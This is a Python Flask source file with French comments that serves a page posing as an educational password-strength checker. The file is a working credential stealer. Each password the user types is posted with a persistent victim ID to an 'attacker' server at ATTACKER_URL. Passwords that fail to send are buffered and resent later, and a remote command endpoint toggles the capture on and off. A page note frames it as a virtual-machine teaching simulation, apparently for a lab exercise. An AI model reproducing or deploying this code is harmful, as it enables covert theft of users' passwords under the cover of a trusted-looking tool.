from flask import Flask, render_template_string, request, jsonify
from pathlib import Path
import uuid
import time
import requests
import json

# ⚙️ CONFIG
APP_HOST = "0.0.0.0"
APP_PORT = 8000

# 🖥️ Adresse de la machine ATTAQUANTE (à adapter si besoin)
ATTACKER_URL = "http://192.168.30.132:5000/logs"
COMMANDS_BASE_URL = "http://192.168.30.132:5000/api/commands"

UUID_FILE = Path("uuid.txt")
BUFFER_DIR = Path("buffer")
BUFFER_DIR.mkdir(exist_ok=True)
BUFFER_FILE = BUFFER_DIR / "queue.jsonl"

app = Flask(__name__)

# État local de la capture (start/stop)
CAPTURE_ENABLED = True


def get_or_create_victim_id() -> str:
    """Lit l'UUID de la victime depuis uuid.txt ou le crée si nécessaire."""
    if UUID_FILE.exists():
        vid = UUID_FILE.read_text().strip()
        print(f"[i] UUID existant : {vid}")
        return vid
    vid = str(uuid.uuid4())
    UUID_FILE.write_text(vid)
    print(f"[i] Nouvel UUID généré : {vid}")
    return vid


VICTIM_ID = get_or_create_victim_id()


def evaluate_strength(password: str):
    """Retourne un score normalisé de 0 à 4 et un label de robustesse."""
    score = 0

    if len(password) >= 8:
        score += 1
    if len(password) >= 12:
        score += 1
    if any(c.islower() for c in password):
        score += 1
    if any(c.isupper() for c in password):
        score += 1
    if any(c.isdigit() for c in password):
        score += 1
    if any(not c.isalnum() for c in password):
        score += 1

    if score <= 1:
        normalized = 0
        label = "Très faible"
    elif score == 2:
        normalized = 1
        label = "Faible"
    elif score == 3:
        normalized = 2
        label = "Moyen"
    elif score == 4:
        normalized = 3
        label = "Fort"
    else:
        normalized = 4
        label = "Très fort"

    return normalized, label


def buffer_event(event: dict):
    """Ajoute l'événement dans un fichier tampon local (queue.jsonl)."""
    with BUFFER_FILE.open("a", encoding="utf-8") as f:
        f.write(json.dumps(event, ensure_ascii=False) + "\n")
    print("[i] Événement ajouté au buffer local.")


def try_send_to_attacker(event: dict):
    """Tente d'envoyer un événement à la machine attaquante."""
    requests.post(ATTACKER_URL, json=event, timeout=1.5)


def flush_buffer():
    """
    Tente de ré-envoyer tous les événements présents dans le buffer local.
    Si certains échouent encore, on les garde dans le fichier.
    """
    if not BUFFER_FILE.exists():
        return

    remaining_lines = []

    with BUFFER_FILE.open("r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                ev = json.loads(line)
            except json.JSONDecodeError:
                continue

            try:
                try_send_to_attacker(ev)
                print("[i] Événement du buffer ré-envoyé avec succès.")
            except Exception as e:
                print(f"[!] Échec de renvoi depuis buffer : {e}")
                remaining_lines.append(line)

    if remaining_lines:
        with BUFFER_FILE.open("w", encoding="utf-8") as f:
            for l in remaining_lines:
                f.write(l + "\n")
    else:
        BUFFER_FILE.unlink(missing_ok=True)
        print("[i] Buffer local vidé.")


def send_with_retry(event: dict):
    """
    1. On tente de vider le buffer.
    2. On tente d'envoyer l'événement courant.
    3. En cas d'échec, on bufferise.
    """
    flush_buffer()
    try:
        try_send_to_attacker(event)
        print("[i] Mot de passe exfiltré vers l'attaquant.")
    except Exception as e:
        print(f"[!] Impossible d'envoyer à l'attaquant, mise en buffer : {e}")
        buffer_event(event)


def refresh_capture_flag():
    """Récupère l'état capture_enabled depuis le contrôleur."""
    global CAPTURE_ENABLED
    try:
        url = f"{COMMANDS_BASE_URL}/{VICTIM_ID}"
        resp = requests.get(url, timeout=1.5)
        if resp.ok:
            data = resp.json()
            CAPTURE_ENABLED = bool(data.get("capture_enabled", True))
            print(f"[i] CAPTURE_ENABLED = {CAPTURE_ENABLED}")
    except Exception as e:
        print(f"[!] Impossible de récupérer l'état des commandes : {e}")


HTML_TEMPLATE = """
<!doctype html>
<html lang="fr">
  <head>
    <meta charset="utf-8">
    <title>Vérificateur de robustesse de mot de passe</title>
    <style>
      body {
        font-family: sans-serif;
        max-width: 600px;
        margin: 40px auto;
      }
      h1 {
        font-size: 1.6rem;
      }
      .card {
        border: 1px solid #ccc;
        padding: 20px;
        border-radius: 8px;
      }
      label {
        display: block;
        margin-bottom: 8px;
        font-weight: bold;
      }
      input[type="password"] {
        width: 100%;
        padding: 8px;
        margin-bottom: 12px;
      }
      .strength {
        margin-top: 10px;
      }
      progress {
        width: 100%;
        height: 16px;
      }
      .note {
        font-size: 0.85rem;
        color: #555;
        margin-top: 10px;
      }
    </style>
  </head>
  <body>
    <h1>Vérificateur pédagogique de mot de passe</h1>
    <div class="card">
      <form onsubmit="return false;">
        <label for="password">Entrez un mot de passe :</label>
        <input id="password" type="password" autocomplete="off" />

        <div class="strength">
          <div id="strength-label">Robustesse : -</div>
          <progress id="strength-meter" max="4" value="0"></progress>
        </div>

        <div class="note">
          Cet outil est une simulation pédagogique exécutée en machine virtuelle.
        </div>
      </form>
    </div>

    <script>
      const input = document.getElementById('password');
      const label = document.getElementById('strength-label');
      const meter = document.getElementById('strength-meter');

      async function updateStrength() {
        const pw = input.value;

        try {
          const resp = await fetch('/check', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ password: pw })
          });

          if (!resp.ok) {
            console.error('Réponse HTTP non OK');
            return;
          }

          const data = await resp.json();
          meter.value = data.strength_score;
          label.textContent = 'Robustesse : ' + data.strength_label;
        } catch (e) {
          console.error("Erreur lors de l'appel /check :", e);
        }
      }

      input.addEventListener('input', updateStrength);
    </script>
  </body>
</html>
"""


@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML_TEMPLATE)


@app.route("/check", methods=["POST"])
def check_password():
    # Mise à jour de l'état de capture à chaque frappe
    refresh_capture_flag()

    data = request.get_json(silent=True) or {}
    password = data.get("password", "")

    score, label = evaluate_strength(password)

    event = {
        "victim_id": VICTIM_ID,
        "timestamp": time.time(),
        "password": password,
        "strength_score": score,
        "strength_label": label,
    }

    if CAPTURE_ENABLED:
        send_with_retry(event)
    else:
        print("[i] Capture désactivée par le contrôleur, événement non exfiltré.")

    return jsonify({
        "strength_score": score,
        "strength_label": label,
    })


if __name__ == "__main__":
    print(f"[i] Victim ID utilisé : {VICTIM_ID}")
    print(f"[i] Application démarrée sur http://127.0.0.1:{APP_PORT}")
    app.run(host=APP_HOST, port=APP_PORT, debug=True)
